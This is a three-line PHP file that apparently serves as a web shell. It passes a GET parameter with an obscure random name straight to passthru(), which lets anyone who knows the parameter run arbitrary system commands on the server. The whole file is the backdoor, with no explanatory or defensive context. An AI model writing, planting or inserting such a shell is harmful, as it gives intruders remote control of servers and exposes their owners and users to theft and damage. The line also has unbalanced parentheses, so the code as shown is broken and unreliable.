<?php
passthru(($_GET['yG8WHxw0']);
?>
